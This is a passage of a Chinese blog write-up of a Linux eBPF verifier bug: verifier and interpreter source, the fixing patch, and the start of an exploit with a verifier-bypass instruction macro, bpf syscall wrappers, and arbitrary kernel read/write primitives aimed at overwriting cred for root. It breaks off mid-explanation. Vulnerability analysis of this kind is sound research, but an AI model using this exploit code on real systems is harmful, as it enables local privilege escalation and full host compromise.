class="keyword">union</span> &#123;</div><div class="line">        <span class="keyword">int</span> imm;           <span class="comment">/* regs[BPF_REG_2].imm */</span></div><div class="line">        <span class="keyword">struct</span> bpf_map *map_ptr;</div><div class="line">    &#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>接着再来看对BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2)的解析,主要在check_cond_jmp_op函数中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div></pre></td><td class="code"><pre><div class="line">&#125; else &#123;</div><div class="line">    err = check_cond_jmp_op(env, insn, &amp;insn_idx);</div><div class="line">        if (err)</div><div class="line">            return err;</div><div class="line">    &#125;</div><div class="line">static int check_cond_jmp_op(struct verifier_env *env,           /* 该函数主要处理条件分支 */</div><div class="line">                 struct bpf_insn *insn, int *insn_idx)&#123;</div><div class="line">    struct reg_state *regs = env-&gt;cur_state.regs;</div><div class="line">    struct verifier_state *other_branch;</div><div class="line">    u8 opcode = BPF_OP(insn-&gt;code);</div><div class="line">    int err;</div><div class="line">    if (opcode &gt; BPF_EXIT) &#123;</div><div class="line">        verbose(&quot;invalid BPF_JMP opcode %x\n&quot;, opcode);</div><div class="line">        return -EINVAL;</div><div class="line">    &#125;</div><div class="line">    if (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</div><div class="line">        if (insn-&gt;imm != 0) &#123;</div><div class="line">            verbose(&quot;BPF_JMP uses reserved fields\n&quot;);</div><div class="line">            return -EINVAL;</div><div class="line">        &#125;</div><div class="line">        /* check src1 operand */</div><div class="line">        err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</div><div class="line">        if (err)</div><div class="line">            return err;</div><div class="line">        if (is_pointer_value(env, insn-&gt;src_reg)) &#123;</div><div class="line">            verbose(&quot;R%d pointer comparison prohibited\n&quot;,</div><div class="line">                insn-&gt;src_reg);</div><div class="line">            return -EACCES;</div><div class="line">        &#125;</div><div class="line">    &#125; else &#123;</div><div class="line">        if (insn-&gt;src_reg != BPF_REG_0) &#123;</div><div class="line">            verbose(&quot;BPF_JMP uses reserved fields\n&quot;);</div><div class="line">            return -EINVAL;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    /* check src2 operand */</div><div class="line">    err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</div><div class="line">    if (err)</div><div class="line">        return err;</div><div class="line">    /* detect if R == 0 where R was initialized to zero earlier */</div><div class="line">    if (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</div><div class="line">        (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</div><div class="line">        regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;                /* 如果目标类型属于立即数 并且 目标的立即数与需要判断的立即数一致 那么直接进入恒等模式 只追随满足条件的分支*/</div><div class="line">        regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</div><div class="line">        if (opcode == BPF_JEQ) &#123;</div><div class="line">            /* if (imm == imm) goto pc+off;</div><div class="line">             * only follow the goto, ignore fall-through</div><div class="line">             */</div><div class="line">            *insn_idx += insn-&gt;off;</div><div class="line">            return 0;</div><div class="line">        &#125; else &#123;                            /*  */</div><div class="line">            /* if (imm != imm) goto pc+off;</div><div class="line">             * only follow fall-through branch, since</div><div class="line">             * that&apos;s where the program will go</div><div class="line">             */</div><div class="line">            return 0;  </div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    other_branch = push_stack(env, *insn_idx + insn-&gt;off + 1, *insn_idx);               /* 若当前比较不属于立即数比较,则会把第二条分支临时保存起来 后续若遇到exit指令 就pop出来第二条分支进行模拟执行 */</div><div class="line">    if (!other_branch)</div><div class="line">        return -EFAULT;</div><div class="line">    /* detect if R == 0 where R is returned value from bpf_map_lookup_elem() */</div><div class="line">    if (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</div><div class="line">        insn-&gt;imm == 0 &amp;&amp; (opcode == BPF_JEQ ||</div><div class="line">                   opcode == BPF_JNE) &amp;&amp;</div><div class="line">        regs[insn-&gt;dst_reg].type == PTR_TO_MAP_VALUE_OR_NULL) &#123;</div><div class="line">        if (opcode == BPF_JEQ) &#123;</div><div class="line">            /* next fallthrough insn can access memory via</div><div class="line">             * this register</div><div class="line">             */</div><div class="line">            regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;</div><div class="line">            /* branch targer cannot access it, since reg == 0 */</div><div class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;</div><div class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].imm = 0;</div><div class="line">        &#125; else &#123;</div><div class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;</div><div class="line">            regs[insn-&gt;dst_reg].type = CONST_IMM;</div><div class="line">            regs[insn-&gt;dst_reg].imm = 0;</div><div class="line">        &#125;</div><div class="line">    &#125; else if (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</div><div class="line">        verbose(&quot;R%d pointer comparison prohibited\n&quot;, insn-&gt;dst_reg);</div><div class="line">        return -EACCES;</div><div class="line">    &#125; else if (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</div><div class="line">           (opcode == BPF_JEQ || opcode == BPF_JNE)) &#123;</div><div class="line">        if (opcode == BPF_JEQ) &#123;</div><div class="line">            /* detect if (R == imm) goto</div><div class="line">             * and in the target state recognize that R = imm</div><div class="line">             */</div><div class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;</div><div class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</div><div class="line">        &#125; else &#123;</div><div class="line">            /* detect if (R != imm) goto</div><div class="line">             * and in the fall-through state recognize that R = imm</div><div class="line">             */</div><div class="line">            regs[insn-&gt;dst_reg].type = CONST_IMM;</div><div class="line">            regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if (log_level)</div><div class="line">        print_verifier_state(env);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>check_cond_jmp_op函数主要用来处理分支语句(BPF_JEQ,BPF_JNE),但是因为这里是立即数之间做比较,如果两个立即数相等就会进入恒等情况,直接退出check_cond_jmp_op函数,因为内核认为这是恒等情况永远都会成立,所以也就没有执行保存分支2到临时栈中的代码(push_stack函数),如果我们在条件成立的情况下接着执行BPF_JMP|BPF_EXIT指令,那么内核就会直接跳出大循环,结束安全检查。<br>看看do_check中BPF_EXIT指令的处理代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</div><div class="line">            <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</div><div class="line">            insn-&gt;imm != <span class="number">0</span> ||</div><div class="line">            insn-&gt;src_reg != BPF_REG_0 ||</div><div class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</div><div class="line">                    verbose(<span class="string">"BPF_EXIT uses reserved fields\n"</span>);</div><div class="line">                    <span class="keyword">return</span> -EINVAL;</div><div class="line">                &#125;</div><div class="line">                <span class="comment">/* eBPF calling convetion is such that R0 is used</span></div><div class="line">                 * to return the value from eBPF program.</div><div class="line">                 * Make sure that it's readable at this time</div><div class="line">                 * of bpf_exit, which means that program wrote</div><div class="line">                 * something into it earlier</div><div class="line">                 */</div><div class="line">                err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</div><div class="line">                <span class="keyword">if</span> (err)</div><div class="line">                    <span class="keyword">return</span> err;</div><div class="line">                <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</div><div class="line">                    verbose(<span class="string">"R0 leaks addr as return value\n"</span>);</div><div class="line">                    <span class="keyword">return</span> -EACCES;</div><div class="line">                &#125;</div><div class="line">process_bpf_exit:</div><div class="line">                insn_idx = pop_stack(env, &amp;prev_insn_idx); <span class="comment">/* 弹出保存在临时栈中的分支 */</span></div><div class="line">                <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;                   <span class="comment">/* 如果pop_stack返回值小于0 */</span></div><div class="line">                    <span class="keyword">break</span>;                            <span class="comment">/* 跳出大循环 */</span></div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    do_print_state = <span class="literal">true</span>;            <span class="comment">/* 否则设置状态为true 检查分支2*/</span></div><div class="line">                    <span class="keyword">continue</span>;                         <span class="comment">/* 并结束本次循环 */</span></div><div class="line">                &#125;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pop_stack</span><span class="params">(<span class="keyword">struct</span> verifier_env *env, <span class="keyword">int</span> *prev_insn_idx)</span></span>&#123;  <span class="comment">/* 弹出临时栈中的分支 */</span></div><div class="line">    <span class="keyword">struct</span> verifier_stack_elem *elem;</div><div class="line">    <span class="keyword">int</span> insn_idx;</div><div class="line">    <span class="keyword">if</span> (env-&gt;head == <span class="literal">NULL</span>)                           <span class="comment">/* 若env-&gt;head为空,那么返回-1 */</span></div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    <span class="built_in">memcpy</span>(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, <span class="keyword">sizeof</span>(env-&gt;cur_state));</div><div class="line">    insn_idx = env-&gt;head-&gt;insn_idx;</div><div class="line">    <span class="keyword">if</span> (prev_insn_idx)</div><div class="line">        *prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;</div><div class="line">    elem = env-&gt;head-&gt;next;</div><div class="line">    kfree(env-&gt;head);</div><div class="line">    env-&gt;head = elem;</div><div class="line">    env-&gt;stack_size--;</div><div class="line">    <span class="keyword">return</span> insn_idx;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>因为前面JNE判断语句结果为恒等,所以并没有对分支2进行入栈备份,导致在执行BPF_EXIT操作后,内核打算执行pop_stack函数来获取分支2时env-&gt;head为空,所以返回-1,而又因为pop_stack的返回值为-1,内核以为代码检查完毕了,所以直接执行break退出了for大循环,结束了对用户指令的检查操作。<br>所以内核在模拟执行时只检查了4条代码就退出了检查。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_DISABLE_VERIFIER()                                                       \</span></div><div class="line">    BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF),             <span class="comment">/* r2 = (u32)0xFFFFFFFF   */</span>   \</div><div class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2),   <span class="comment">/* if (r2 == -1) &#123;        */</span>   \</div><div class="line">    BPF_MOV64_IMM(BPF_REG_0, 0),                      <span class="comment">/*   exit(0);             */</span>   \</div><div class="line">    BPF_EXIT_INSN()                                   <span class="comment">/* &#125;                      */</span>   \</div></pre></td></tr></table></figure></p>
<p>然后再来看实际执行的情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">实际执行调用链：__vfs_write -&gt; new_sync_write -&gt; sock_write_iter -&gt; sock_sendmsg -&gt; sock_sendmsg_nosec -&gt; unix_dgram_sendmsg -&gt; sk_filter -&gt; bpf_prog_run_save_cb -&gt; __bpf_prog_run</div></pre></td></tr></table></figure></p>
<p>函数__bpf_prog_run用做实际解析并执行指令,该函数中有一个大的跳转表(jumptable),通过把每条指令的insn-&gt;code成员作为跳转表的索引值,跳转到需要执行的分支处对不同的指令做处理<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select_insn:</div><div class="line">    <span class="keyword">goto</span> *jumptable[insn-&gt;code];</div></pre></td></tr></table></figure></p>
<p>我们主要关注的是以下两条分支,对应着用户层传入的前两条指令<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[BPF_ALU | BPF_MOV | BPF_K] = &amp;&amp;ALU_MOV_K,</div><div class="line">[BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K,</div></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ALU_MOV_K:</div><div class="line">        DST = (u32) IMM;  <span class="comment">/*#define DST   regs[insn-&gt;dst_reg] ;  #define IMM	insn-&gt;imm */</span></div><div class="line">        CONT;</div></pre></td></tr></table></figure>
<p>实际解析BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF)指令时会把有符号32位的IMM(insn-&gt;imm)强转为无符号32型,并赋值给无符号64位的DST(regs[insn-&gt;dst_reg]),所以此时DST==0x00000000FFFFFFFF<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">JMP_JNE_K:                              <span class="comment">/* 判断当前指令立即数是否与目标寄存器一致  */</span></div><div class="line">        <span class="keyword">if</span> (DST != IMM) &#123;               <span class="comment">/* 因为DST在上条指令被赋值为了u32类型的0x00000000FFFFFFFF,而本次IMM在比较时会被扩展为无符号64位的0xFFFFFFFFFFFFFFFF,所以比较肯定不一致 */</span></div><div class="line">            insn += insn-&gt;off;          <span class="comment">/* 当前指令 + 当前指令的偏移参数 = 下条需要执行指令的位置 */</span></div><div class="line">            CONT_JMP;                   <span class="comment">/* #define CONT_JMP (&#123; insn++; goto select_insn; &#125;) */</span></div><div class="line">        &#125;</div><div class="line">        CONT;</div></pre></td></tr></table></figure></p>
<p>在解析BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2)指令时,因为DST属于无符号64位类型,比较时会把有符号32位的IMM(insn-&gt;imm)隐式转为无符号64位(0xFFFFFFFFFFFFFFFF),而DST最开始被赋值为0x00000000FFFFFFFF所以比较的结果肯定是不相等<br>分析到这里我们可以看出模拟执行时JNE比较结果为恒等,而实际执行是JNE比较结果却为不等,因为实际执行的结果不等,所以会跳过两条指令继续执行,而分支2的指令在模拟执行时是没有被检查的,所以我们可以把分支2构造为我们用来提权的代码,这样就绕过了内核的安全检查,执行任何我们想执行的代码了。</p>
<h3 id="补丁用意"><a href="#补丁用意" class="headerlink" title="补丁用意"></a>补丁用意</h3><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</div><div class="line">index 625e358..c086010 100644</div><div class="line">--- a/kernel/bpf/verifier.c</div><div class="line">+++ b/kernel/bpf/verifier.c</div><div class="line">@@ -2408,7 +2408,13 @@ static int check_alu_op(struct bpf_verifier_env *env, struct bpf_insn *insn)</div><div class="line">* remember the value we stored into this reg</div><div class="line">*/</div><div class="line">            regs[insn-&gt;dst_reg].type = SCALAR_VALUE;</div><div class="line">-             __mark_reg_known(regs + insn-&gt;dst_reg, insn-&gt;imm);</div><div class="line">+             if (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</div><div class="line">+             __mark_reg_known(regs + insn-&gt;dst_reg,</div><div class="line">+                 insn-&gt;imm);</div><div class="line">+             &#125; else &#123;</div><div class="line">+             __mark_reg_known(regs + insn-&gt;dst_reg,</div><div class="line">+                 (u32)insn-&gt;imm);</div><div class="line">+             &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; else if (opcode &gt; BPF_END) &#123;</div></pre></td></tr></table></figure>
<p>添加了对bpf指令目标位数的检查，避免64位与32位的混淆比较。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><p>使用bpf的流程：<br>调用syscall（<strong>NR_bpf，BPF_MAP_CREATE，&amp;attr，size(attr)）申请一个map，在attr结构体中指定map的类型，大小，最大兼容等级。<br>调用syscall（</strong>NR_bpf，BPF_PROG_LOAD,&amp;attr，sizeof（attr）），将用户态的BPF指令加载到内核态，attr包含指令数量，指令首地址，日志等级。内核态在实际执行这些指令之前会先利用虚拟执行的方式做安全校验，如果安全校验通过后，指令被成功加载到内核，然后实际执行。<br>使用setsockopt（sockets。SO_SOCKET，SO_ATTACK_BPF，&amp;progfd，sizeof（progfd））把BPF句柄绑定到指定的socket上，Progfd为第二步的返回值。<br>最后通过操作第三步的socket来触发BPF实际执行。<br>write(sockets[0], buffer, sizeof(buffer))</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="构造读写原语"><a href="#构造读写原语" class="headerlink" title="构造读写原语"></a>构造读写原语</h4><p>现在我们已经能够给内核注入代码了，但我们需要怎么去提权呢？也就是注入的代码该怎么写呢？<br>这里就涉及到了我们前面说过的bpf的数据共享，通过BPF_MAP_CREATE选项在内核中创建一个映射表，因为该映射表是内核层与应用层共享的所以我们可以通过在用户层修改该映射表中的数据从而控制内核中bpf被执行的代码。<br>大概思路如下:<br>首先通过BPF_MAP_CREATE选项创建一个map映射表并设置该map可存放的最大元素个数为3，分别表示操作指令(op)，读写地址(address)，读写值(value)。这个映射表就组成了一条控制指令。<br>接着利用BPF_PROG_LOAD选项加载我们精心构造的bpf规则指令到内核。<br>最后使用setsockopt函数的SO_ATTACK_BPF选项绑定精心构造的bpf规则指令到套接字。<br>现在我们只要对套接字进行写操作就能触发我们注入到内核的bpf指令。<br>bpf指令伪代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">op = get_map(key=<span class="number">0</span>)</div><div class="line">address = get_map(key=<span class="number">1</span>) </div><div class="line">value = get_map(key=<span class="number">2</span>)</div><div class="line"><span class="keyword">if</span> (op == <span class="number">0</span>)</div><div class="line">    get_map(key=<span class="number">2</span>) = fp</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">1</span>)</div><div class="line">    get_map(key=<span class="number">2</span>) = skbuff</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">2</span>)</div><div class="line">    get_map(key=<span class="number">2</span>) = read(address)</div><div class="line"><span class="keyword">else</span> </div><div class="line">    write(address,value)</div></pre></td></tr></table></figure></p>
<p>bpf系统调用的BPF_MAP_LOOKUP_ELEM选项用来获取映射表指定key的值，我们封装为任意读，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span>&#123;</div><div class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;</div><div class="line">        .map_fd = fd,</div><div class="line">        .key = ptr_to_u64(key),</div><div class="line">        .value = ptr_to_u64(value),</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span>  <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> value;</div><div class="line">    <span class="keyword">if</span> (bpf_lookup_elem(mapfd, &amp;key, &amp;value)) &#123;         <span class="comment">/* 根据传入的key获取value */</span></div><div class="line">        fail(<span class="string">"bpf_lookup_elem failed '%s'\n"</span>, strerror(errno));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> value;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>BPF_MAP_UPDATE_ELEM选项用来更新指定key的值，我们用来实现任意写。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *key, <span class="keyword">void</span> *value, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> flags)</span></span>&#123;</div><div class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;</div><div class="line">        .map_fd = fd,</div><div class="line">        .key = ptr_to_u64(key),</div><div class="line">        .value = ptr_to_u64(value),</div><div class="line">        .flags = flags,</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr)); <span class="comment">/* 根据传入的key设置value的值 */</span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">update_elem</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">unsigned</span> <span class="keyword">long</span> value)</span> </span>&#123;   </div><div class="line">    <span class="keyword">if</span> (bpf_update_elem(mapfd, &amp;key, &amp;value, <span class="number">0</span>)) &#123;</div><div class="line">        fail(<span class="string">"bpf_update_elem failed '%s'\n"</span>, strerror(errno));</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>write(sockets[0], buffer, sizeof(buffer))用作触发bpf规则的实际执行。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">/* 封装的任意读写 cc控制 */</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">sendcmd</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> op, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> value)</span> </span>&#123; </div><div class="line">    update_elem(<span class="number">0</span>, op);               <span class="comment">/* 修改map元素0中的value为指定的op指令*/</span></div><div class="line">    update_elem(<span class="number">1</span>, addr);             <span class="comment">/* 修改map元素1中的value为需要读/写的内核地址*/</span></div><div class="line">    update_elem(<span class="number">2</span>, value);            <span class="comment">/* 修改map元素2中的value为需要写入的值*/</span></div><div class="line">    writemsg();                       <span class="comment">/* 触发bpf程序实际执行 */</span></div><div class="line">    <span class="keyword">return</span> get_value(<span class="number">2</span>);              <span class="comment">/* 获取map元素2中的value值 */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>因为这个漏洞可以重复触发，所以只需要把上面的函数做一下封装，就可以组成任意读写的原语，通过控制op参数的值促使内核做不同的读写操作：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_skbuff</span><span class="params">()</span> </span>&#123;	<span class="comment">/* 封装 直接获取绑定socket的skbuff地址 */</span></div><div class="line">	<span class="keyword">return</span> sendcmd(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);    <span class="comment">/* op = 1：获取skbuff的值，addr=0，value=0，返回值为skbuff的地址 */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_fp</span><span class="params">()</span> </span>&#123;	   <span class="comment">/* 封装 直接获取栈帧 */</span></div><div class="line">	<span class="keyword">return</span> sendcmd(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);   <span class="comment">/* op = 0：获取内核栈帧，addr=0，value=0，返回值为内核栈帧 */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">read64</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span> </span>&#123;	            <span class="comment">/* 封装内核读 */</span></div><div class="line">	<span class="keyword">return</span> sendcmd(<span class="number">2</span>, addr, <span class="number">0</span>);                         <span class="comment">/* op = 2：执行读操作，addr：需要读的内核地址，返回值为读取的值 */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">write64</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> val)</span> </span>&#123;	<span class="comment">/* 封装内核写 */</span></div><div class="line">	(<span class="keyword">void</span>)sendcmd(<span class="number">3</span>, addr, val);                        <span class="comment">/* op = 3：执行写操作，addr：需要写的内核地址，value：需要写的值 */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在我们拥有了任意读写原语之后我们就可以来提权了，常规的提权方式这里有两种：</p>
<h4 id="泄漏fp"><a href="#泄漏fp" class="headerlink" title="泄漏fp"></a>泄漏fp</h4><p>第一种首先通过我们封装的get_fp来获取当前进程的栈地址，然后通过经典的 栈地址 &amp; ~(0x4000-1)计算出当前进程的thread_info结构体的起始地址，接着通过任意读获取task_struct结构体，有了task_struct结构体之后我们就可以通过偏移量去修改cred结构体实现提权了。</p>
